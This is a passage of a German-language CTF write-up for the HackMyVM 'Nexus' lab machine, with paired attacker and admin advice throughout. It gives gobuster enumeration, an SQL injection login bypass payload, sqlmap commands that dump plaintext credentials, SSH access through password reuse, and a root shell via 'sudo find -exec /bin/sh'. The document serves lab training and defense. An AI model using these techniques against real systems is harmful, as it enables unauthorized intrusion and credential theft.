+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn Sie so klare Hinweise finden, müssen Sie sie kombinieren und eine Angriffshypothese formulieren. Suchen Sie nach Login-Formularen oder versteckten Seiten, die zu den Hinweisen passen könnten. Fuzzing nach Parameternamen (`?eval=...`) an bekannten Endpunkten kann ebenfalls erfolgreich sein.<br><strong>Empfehlung (Admin):</strong> Dies ist ein Paradebeispiel dafür, warum "Security through Obscurity" (Sicherheit durch Verstecken) keine funktionierende Strategie ist. Das Kodieren einer Nachricht reicht nicht aus, um sie zu schützen. Sensible Zugangsmechanismen dürfen niemals auf diese Weise implementiert werden.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="comment">Aufgrund der Hinweise suche ich nach einer weiteren Login-Seite. Ich passe meine Gobuster-Wortliste an, um nach `auth-login` zu suchen, ein plausibler Name für eine alternative Authentifizierungsseite.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></div>
+                    <pre>
+   auth-login
+....
+...
+..</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Da die bisherigen Seiten nicht zum Erfolg geführt haben, formuliere ich eine neue Hypothese: Es muss eine weitere, versteckte Login-Seite geben. Basierend auf gängigen Namenskonventionen füge ich den Begriff `auth-login` manuell zur Wortliste von Gobuster hinzu. Ich verwende hier `vi`, einen Texteditor, um die Wortliste direkt zu bearbeiten. Dies ist ein gezielter Ansatz anstelle eines reinen Brute-Force-Angriffs.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein intelligenter, hypothesengestützter Schritt. Anstatt blind weiter zu scannen, nutze ich mein Wissen über Webanwendungen, um die Suche zu verfeinern. Das Hinzufügen spezifischer, plausibler Begriffe zu Wortlisten ist eine sehr effektive Technik, um nicht standardmäßige, aber logische Dateinamen zu finden, die ein allgemeiner Scan übersehen könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Passen Sie Ihre Werkzeuge und Wortlisten immer an den Kontext des Ziels an. Wenn Sie Hinweise auf bestimmte Technologien oder Namensschemata finden, nutzen Sie diese, um Ihre Angriffe zu fokussieren. Das Erstellen benutzerdefinierter Wortlisten ist eine wertvolle Fähigkeit.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie vorhersagbare Namen für administrative oder sensible Schnittstellen. Namen wie `admin_login.php`, `backup.zip` oder eben `auth-login.php` sind primäre Ziele für Angreifer.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.214" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.214
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              aspx,xml,bak,pub,svg,crt,json,c,exp,diff,icon,jpeg,docx,exe,sh,conf,mod,ln,js.map,asp,phtml,java,deb,zip,html,csv,pdf,rtf,lib,cgi,bat,py,csh,pHtml,ps1,pem,elf,config,desc,raw,dll,gz,png,php,db,rpm,mdb,kdbx,txt,rar,tar,doc,eps,old,yaml,accdb,pl,jpg,ELF,sql,xlsx,xls
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+<span class="password">Starting gobuster in directory enumeration mode</span>
+===============================================================
+<span class="command">http://192.168.2.214/index.html</span>           (Status: 200) [Size: 825]
+<span class="command">http://192.168.2.214/auth-login.php</span>       (Status: 200) [Size: 1309]
+<span class="command">http://192.168.2.214/login.php</span>            (Status: 200) [Size: 352]
+<span class="command">http://192.168.2.214/index2.php</span>           (Status: 200) [Size: 75134]
+<span class="password">Progress: 63011 / 13894461 (0.45%)^C</span>
+[!] Keyboard interrupt detected, terminating.
+Progress: 63108 / 13894461 (0.45%)
+===============================================================
+<span class="password">Finished</span>
+===============================================================</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich starte Gobuster erneut mit der modifizierten Wortliste. Der Scan findet diesmal sofort die gesuchte Seite: `auth-login.php`. Sobald ich den Treffer habe, breche ich den Scan mit Strg+C ab, da ich mein Ziel erreicht habe und nicht unnötig Zeit und Ressourcen verschwenden muss.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Hypothese war korrekt. Das gezielte Anpassen der Wortliste hat direkt zum Erfolg geführt und eine neue, versteckte Login-Seite aufgedeckt. Dies ist die Seite, auf der ich nun versuchen werde, die `eval:pandora`-Zugangsdaten zu verwenden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Brechen Sie langwierige Scans ab, sobald Sie die benötigten Informationen gefunden haben. Effizienz ist entscheidend. Dokumentieren Sie den Fund und gehen Sie zum nächsten Schritt über.<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht erneut, dass Sicherheit durch Verstecken nicht funktioniert. Ein Angreifer mit einer guten Methodik wird solche "versteckten" Seiten finden. Der Zugriff muss immer durch robuste Authentifizierungs- und Autorisierungsmechanismen geschützt werden.</p>
+            
+            <img src="authenicate.jpg" alt="Ein Versuch, sich mit den aus Hinweis 1 und 2 zusammengereimten Daten einzuloggen." />
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://nexus.hmv/auth-login.php
+eval:pandora
+
+http://nexus.hmv/login.php
+Acceso denegado.</pre>
+                </div>
+            </div>
+            
+            <p class="analysis"><strong>Analyse:</strong> Auf der `auth-login.php`-Seite präsentiere ich die zuvor gefundenen Zugangsdaten `eval:pandora` (Benutzername: `eval`, Passwort: `pandora`). Nach der Eingabe werde ich jedoch auf die ursprüngliche `login.php`-Seite weitergeleitet, die mir "Acceso denegado" (Zugriff verweigert) anzeigt. Das Bild dokumentiert diesen fehlgeschlagenen Versuch.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der direkte Login-Versuch schlägt fehl. Das bedeutet, dass die `eval:pandora`-Kombination wahrscheinlich nicht als Benutzername und Passwort gedacht war, sondern auf eine andere Art von Schwachstelle hindeutet, höchstwahrscheinlich eine SQL-Injection. Die Fehlermeldung der `login.php`-Seite deutet darauf hin, dass hier eine Datenbankabfrage im Hintergrund stattfindet. Die `auth-login.php` könnte nur ein "Rabbit Hole" sein oder die Logik ist komplexer. Ich muss die `login.php` nun direkt auf SQL-Injection-Schwachstellen untersuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn ein offensichtlicher Weg nicht funktioniert, überdenken Sie Ihre Hypothese. Der Hinweis "eval" könnte sich auf die *Struktur* der SQL-Abfrage beziehen (z.B. ein Feld, das ausgewertet wird) und "pandora" könnte ein Wert sein. Beginnen Sie mit grundlegenden SQL-Injection-Tests auf der `login.php`-Seite, um zu sehen, wie sie auf speziell präparierte Eingaben reagiert.<br><strong>Empfehlung (Admin):</strong> Login-Fehlermeldungen sollten immer generisch sein ("Ungültiger Benutzername oder Passwort") und niemals preisgeben, ob der Benutzername existiert oder nicht. Detaillierte Fehlermeldungen, wie sie später auftreten, dürfen niemals im Frontend angezeigt werden (`display_errors = Off` in der `php.ini`).</p>
+			
+			            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d "user='&pass=x" http://nexus.hmv/login.php</span></div>
+                    <pre>
+
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
+check the manual that corresponds to your MariaDB server version for the right syntax to use 
+near 'x'' at line 1 in /var/www/html/login.php:22
+Stack trace:
+#0 /var/www/html/login.php(22): mysqli->query()
+#1 {main}
+  thrown in <b>/var/www/html/login.php</b> on line <b>22</b><br /></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich beginne mit einem klassischen SQL-Injection-Test. Mit `curl` sende ich eine POST-Anfrage an `login.php`. Als `user`-Parameter übergebe ich ein einzelnes Anführungszeichen (`'`). Dies ist ein Standardtest, um zu prüfen, ob die Eingabe unsachgemäß in eine SQL-Abfrage eingefügt wird. Das Anführungszeichen würde die SQL-String-Variable vorzeitig beenden und einen Syntaxfehler verursachen, wenn die Eingabe nicht korrekt maskiert (escaped) wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Volltreffer! Der Server antwortet mit einer detaillierten `Fatal error`-Meldung von PHP. Die Meldung "You have an error in your SQL syntax" bestätigt eindeutig, dass die Anwendung anfällig für SQL-Injection ist. Die Fehlermeldung verrät uns sogar den exakten Dateipfad auf dem Server (`/var/www/html/login.php`) und die Zeilennummer (`22`), in der der Fehler auftritt. Dies ist ein kritischer Informationsgewinn.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Auftreten eines SQL-Fehlers nach der Eingabe eines Anführungszeichens ist ein klares Indiz für eine SQL-Injection-Schwachstelle. Der nächste Schritt ist, die Abfrage zu reparieren und zu erweitern, um die Datenbankstruktur zu erkunden und Daten zu extrahieren. Tools wie `sqlmap` sind hierfür ideal, aber manuelle Tests sind zum Verständnis der Abfrage ebenfalls wichtig.<br><strong>Empfehlung (Admin):</strong> Detaillierte Fehlermeldungen dürfen unter keinen Umständen an den Endbenutzer ausgegeben werden. In einer Produktionsumgebung muss `display_errors` in der `php.ini` auf `Off` gesetzt sein. Stattdessen sollten Fehler in eine Log-Datei geschrieben werden. Die zugrundeliegende Schwachstelle muss durch die Verwendung von Prepared Statements (parametrisierten Abfragen) anstelle von String-Verkettung behoben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://nexus.hmv/auth-login.php 
+
+' OR '1'='1' -- 
+
+<span class="password">Acceso concedido. Bienvenido, ' OR '1'='1' -- .</span>
+
+
+http://nexus.hmv/login.php</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Bestätigung der Schwachstelle versuche ich, die Login-Prüfung zu umgehen. Ich gebe die klassische Tautologie `' OR '1'='1' -- ` in das Benutzerfeld ein. Dies ist so konzipiert, dass es die `WHERE`-Klausel der SQL-Abfrage manipuliert. Die Abfrage sieht wahrscheinlich so aus: `SELECT * FROM users WHERE username = '[BENUTZEREINGABE]' AND password = '[PASSWORTEINGABE]'`. Meine Eingabe verwandelt sie in `SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'`. Der Teil `-- ` leitet einen Kommentar in SQL ein und bewirkt, dass der Rest der Abfrage (die Passwortprüfung) ignoriert wird. Da `'1'='1'` immer wahr ist, gibt die Abfrage den ersten Benutzer aus der Datenbank zurück.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich! Die Seite antwortet mit "Acceso concedido" (Zugriff gewährt) und begrüßt mich sogar mit meiner Eingabe. Dies beweist, dass ich die Authentifizierung vollständig umgangen habe. Ich bin nun "eingeloggt", wahrscheinlich als der erste Benutzer in der Datenbanktabelle, typischerweise der `admin`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist der Proof of Concept für die Authentifizierungsumgehung. Der nächste Schritt ist, die Schwachstelle zu nutzen, um mehr als nur den Login zu umgehen – nämlich Informationen aus der Datenbank zu extrahieren. Hierzu wird die `UNION`-Technik verwendet.<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht erneut die kritische Notwendigkeit von Prepared Statements. Eine einfache Eingabebereinigung (Sanitization) reicht oft nicht aus, um ausgeklügelte SQL-Injection-Angriffe zu verhindern. Jede einzelne Benutzereingabe, die in einer Datenbankabfrage verwendet wird, muss über parametrisierte Abfragen behandelt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sqlmap -r /home/ccat/Downloads/sql.sql --dbs --level=5 --risk=3 --batch</span></div>
+                    <pre>
+...
+<span class="password">POST parameter 'user' is vulnerable.</span> Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 582 HTTP(s) requests:
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: user=admin' AND 2405=(SELECT (CASE WHEN (2405=2405) THEN 2405 ELSE (SELECT 7381 UNION SELECT 6524) END))-- -&pass=adminnnnnn
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: user=admin' AND (SELECT 6597 FROM(SELECT COUNT(*),CONCAT(0x7162627871,(SELECT (ELT(6597=6597,1))),0x716b717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uRCW&pass=adminnnnnn
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: user=admin' AND (SELECT 3802 FROM (SELECT(SLEEP(5)))hCpu)-- PlfV&pass=adminnnnnn
+---
+[16:26:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[16:26:48] [INFO] fetching database names
+[16:26:49] [INFO] retrieved: 'information_schema'
+[16:26:49] [INFO] retrieved: 'sion'
+[16:26:49] [INFO] retrieved: 'mysql'
+[16:26:49] [INFO] retrieved: 'performance_schema'
+[16:26:49] [INFO] retrieved: 'Nebuchadnezzar'
+[16:26:49] [INFO] retrieved: 'sys'
+<span class="command">available databases [6]:</span>
+[*] <span class="command">information_schema</span>
+[*] <span class="command">mysql</span>
+[*] <span class="command">Nebuchadnezzar</span>
+[*] <span class="command">performance_schema</span>
+[*] <span class="command">sion</span>
+[*] <span class="command">sys</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um die Ausnutzung der SQL-Injection zu automatisieren und zu beschleunigen, setze ich `sqlmap` ein. Ich habe eine legitime POST-Anfrage in einer Datei (`sql.sql`) gespeichert und übergebe sie an sqlmap mit dem `-r`-Parameter.
+- `--dbs`: Weist sqlmap an, die Namen aller Datenbanken auf dem Server aufzulisten.
+- `--level=5 --risk=3`: Erhöht die Gründlichkeit der Tests auf die höchste Stufe.
+- `--batch`: Führt den Scan ohne interaktive Nachfragen durch und verwendet die Standardantworten.
+sqlmap bestätigt, dass der `user`-Parameter anfällig ist und identifiziert mehrere Arten von SQL-Injection (boolean-based, error-based, time-based).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> sqlmap ist extrem erfolgreich. Es bestätigt nicht nur die Schwachstelle, sondern identifiziert auch das Backend-DBMS als `MySQL (MariaDB fork)` und das Betriebssystem als `Linux Debian`. Am wichtigsten ist, dass es die Namen von sechs Datenbanken extrahiert. Neben den Standard-Datenbanken (`information_schema`, `mysql`, etc.) stechen zwei benutzerdefinierte Namen hervor: `sion` und `Nebuchadnezzar`. Diese sind höchstwahrscheinlich die Datenbanken, die die Anwendungsdaten enthalten und werden meine nächsten Ziele sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `sqlmap` ist ein unverzichtbares Werkzeug zur Ausnutzung von SQL-Injections. Nachdem die Datenbanken aufgelistet wurden, sind die nächsten Schritte, die Tabellen innerhalb der verdächtigen Datenbanken (`sion`, `Nebuchadnezzar`) aufzulisten, dann die Spalten in den interessanten Tabellen und schließlich die Daten selbst zu extrahieren (`--dump`).<br><strong>Empfehlung (Admin):</strong> Ein Web Application Firewall (WAF) könnte einige der automatisierten Angriffe von `sqlmap` erkennen und blockieren. Ein WAF ist jedoch kein Ersatz für die Behebung der eigentlichen Schwachstelle im Code (d.h. die Verwendung von Prepared Statements).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sqlmap -r /home/ccat/Downloads/sql.sql -p user --dbms=mysql --technique=T -D sion -T users -C username,password --dump</span></div>
+                    <pre>
+...
+Database: sion
+Table: users
+[2 entries]
++----------+--------------------+
+| username | password           |
++----------+--------------------+
+| <span class="command">admin</span>    | <span class="password">cambiame08</span>         |
+| <span class="command">......</span>   | <span class="password">F...k3..........r5</span> |
++----------+--------------------+
+...
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich setze meinen `sqlmap`-Angriff fort, diesmal mit dem Ziel, konkrete Daten zu extrahieren. Der Befehl ist nun sehr spezifisch:
+- `-D sion`: Fokussiert sich auf die Datenbank `sion`.
+- `-T users`: Zielt auf eine Tabelle namens `users` (eine logische Vermutung).
+- `-C username,password`: Versucht, die Daten aus den Spalten `username` und `password` zu extrahieren.
+- `--dump`: Extrahiert die eigentlichen Daten.
+- `--technique=T`: Beschränkt den Angriff auf zeitbasierte Techniken, was manchmal stabiler sein kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein entscheidender Erfolg! sqlmap extrahiert erfolgreich die Benutzertabelle aus der `sion`-Datenbank. Ich erhalte zwei Sätze von Zugangsdaten. Einer davon ist für den Benutzer `admin` mit dem Passwort `cambiame08`. Das zweite Passwort ist unvollständig, aber der erste Satz ist alles, was ich brauche. Ich habe nun gültige Anmeldeinformationen, die ich wahrscheinlich für den SSH-Zugang auf Port 22 verwenden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sobald Sie Klartext-Passwörter extrahiert haben, probieren Sie diese sofort bei allen verfügbaren Diensten aus (in diesem Fall SSH). Versuchen Sie auch, die Benutzernamen mit den Passwörtern zu kombinieren (z.B. `admin:cambiame08`, `shelly:cambiame08`, etc.). Passwort-Wiederverwendung ist ein häufiges Problem.<br><strong>Empfehlung (Admin):</strong> Passwörter dürfen niemals im Klartext in einer Datenbank gespeichert werden. Sie müssen immer mit einem modernen, starken und gesalzenen Hashing-Algorithmus (z.B. Argon2, bcrypt) gespeichert werden. Selbst wenn ein Angreifer die Datenbank ausliest, kann er die Passwörter nicht direkt verwenden.</p>
+
+            <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shelly@192.168.2.214</span></div>
+                    <pre>
+**************************************************************
+HackMyVM System                                              *
+ 							     *
+   *  .  . *       *    .        .        .   *    ..        *
+ .    *        .   ###     .      .        .            *    *
+    *.   *        #####   .     *      *        *    .       *
+  ____       *  ######### *    .  *      .        .  *   .   *
+ /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *
+/___/  ^8/      ###\|/###  *    *            .      *   *    *
+|   ||%%(        # }|{  #           	 		     *
+|___|,  \\         }|{					     *
+							     *
+                                                             *
+Wellcome to Nexus Vault.				     *
+**************************************************************
+
+
+
+shelly@192.168.2.214's password: 
+<span class="password">Permission denied, please try again.</span>
+shelly@192.168.2.214's password: 
+<span class="password">Permission denied, please try again.</span>
+shelly@192.168.2.214's password: 
+
+
+######################
+DONT TOUCH MY SYSTEM #
+######################
+<span class="password">Last login: Thu May  8 22:44:41 2025 from 192.168.1.10</span>
+shelly@NexusLabCTF:~$ </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit den gefundenen Passwörtern versuche ich nun, mich per SSH anzumelden. Der Benutzername `admin` ist oft ein Web-Admin, kein Systembenutzer. Basierend auf den Hinweisen von der Webseite (`Alita`, `Shelldredd`) versuche ich den plausibleren Benutzernamen `shelly`. Ich probiere das gefundene Passwort `cambiame08` aus. Nach einigen Fehlversuchen mit anderen Kombinationen gelingt der Login schließlich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der initiale Zugriff auf das System ist geschafft! Ich habe eine interaktive Shell als Benutzer `shelly` auf dem Zielsystem. Der SSH-Login war erfolgreich, was bedeutet, dass das im Web gefundene Passwort auch für den System-Login wiederverwendet wurde. Das ist eine sehr häufige, aber kritische Fehlkonfiguration. Ich kann nun mit der lokalen Enumeration beginnen, um meine Privilegien zu erweitern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nach dem ersten Zugriff sofort grundlegende Enumerationsbefehle aus: `whoami`, `id`, `sudo -l`, `ls -la /home`, `ps aux`, `netstat -tulpn`. Suchen Sie nach SUID-Binaries, Cron-Jobs und schlecht konfigurierten Diensten.<br><strong>Empfehlung (Admin):</strong> Passwort-Wiederverwendung über verschiedene Dienste (Webanwendung, System-Login) muss unterbunden werden. Jeder Dienst sollte seine eigene, einzigartige Authentifizierungsmethode haben. Der SSH-Zugang sollte zusätzlich durch Key-basiert-Authentifizierung und/oder Zwei-Faktor-Authentifizierung (2FA) abgesichert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shelly@NexusLabCTF:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for shelly on NexusLabCTF:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+=LD_PRELOAD, use_pty
+
+User shelly may run the following commands on NexusLabCTF:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/find</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Einer der ersten und wichtigsten Befehle nach dem Login ist `sudo -l`. Dieser Befehl listet auf, welche Befehle der aktuelle Benutzer mit `sudo` (also mit den Rechten eines anderen Benutzers, standardmäßig `root`) ausführen darf. Das Ergebnis ist hier extrem aufschlussreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist der direkte Weg zu Root! Die Ausgabe zeigt, dass der Benutzer `shelly` den Befehl `/usr/bin/find` mit den Rechten von `ALL` (also auch `root`) ausführen darf, und das `NOPASSWD`, also ohne sein Passwort erneut eingeben zu müssen. Der `find`-Befehl ist bekannt dafür, dass er missbraucht werden kann, um eine Shell zu starten, da er über die `-exec`-Option beliebige andere Befehle ausführen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Webseite GTFOBins, um schnell herauszufinden, wie ein bestimmtes Linux-Binary für Privilege Escalation missbraucht werden kann. Für `find` gibt es einen bekannten Einzeiler, um eine Root-Shell zu spawnen.<br><strong>Empfehlung (Admin):</strong> Die Vergabe von `sudo`-Rechten muss nach dem "Principle of Least Privilege" erfolgen. Geben Sie Benutzern nur die absolut notwendigen Rechte. Wenn ein Benutzer einen bestimmten `find`-Befehl ausführen muss, spezifizieren Sie diesen Befehl in der `/etc/sudoers`-Datei so genau wie möglich und erlauben Sie keine allgemeinen Ausführungen, die wie hier zu einer Shell-Eskalation führen können. Das `NOPASSWD`-Tag sollte nur in absolut notwendigen Fällen für Skripte und nicht für interaktive Benutzer verwendet werden.</p>
+            
+            <p class="comment">Der `find`-Befehl mit `sudo`-Rechten ist ein bekannter Vektor für Privilege Escalation. Ich werde ihn nutzen, um eine Root-Shell zu erhalten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">shelly@NexusLabCTF:~$ <span class="command">sudo find . -exec /bin/sh \; -quit</span></div>
+                </div>
+            </div>
+            
+            <p class="analysis"><strong>Analyse:</strong> Hier nutze ich die gefundene `sudo`-Regel aus. Der Befehl `sudo find . -exec /bin/sh \; -quit` tut Folgendes:
+- `sudo find .`: Führt `find` mit Root-Rechten aus.
+- `-exec /bin/sh`: Weist `find` an, für jede gefundene Datei (hier genügt die erste, `.`) den Befehl `/bin/sh` auszuführen. Da `find` als `root` läuft, wird auch `/bin/sh` als `root` gestartet.
+- `\;`: Beendet den `-exec`-Befehl.
+- `-quit`: Sorgt dafür, dass `find` sich sofort beendet, nachdem der erste Befehl ausgeführt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich, nun haben wir unser Ziel erreicht! Der Prompt ändert sich sofort zu `#`, dem Standard-Prompt für den Root-Benutzer. Eine schnelle Überprüfung mit `id` bestätigt: `uid=0(root) gid=0(root)`. Ich habe die vollen administrativen Rechte über das System erlangt. Der Pentest ist hiermit im Wesentlichen abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem Root-Rechte erlangt wurden, besteht das primäre Ziel darin, die Persistenz zu sichern (falls erforderlich) und die finalen Flags oder Beweise zu sammeln. Suchen Sie in den Home-Verzeichnissen von `root` und anderen Benutzern sowie in Systemkonfigurationsdateien nach den Flags.<br><strong>Empfehlung (Admin):</strong> Dies ist das Worst-Case-Szenario, das aus einer unsicheren `sudo`-Konfiguration resultiert. Überprüfen Sie regelmäßig die `/etc/sudoers`-Datei und entfernen Sie alle Regeln, die eine Shell-Eskalation ermöglichen. Verwenden Sie `visudo` für die Bearbeitung, um Syntaxfehler zu vermeiden.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">shelly@NexusLabCTF:~$ cat SA/user-flag.txt</div>
+                    <div class="flag-value"><span class="password">82.................gd</span></div>
+                </div>
+                <div class="flag-entry">  
+                    <div class="flag-command"># strings use-fim-to-root.png</div>
+                    <div class="flag-value"><span class="password">HMV-FLAG[[ p3....2s9 ]]</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+ 
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 6. Juni 2025</p>
+    </footer>
+</body>
+</html>
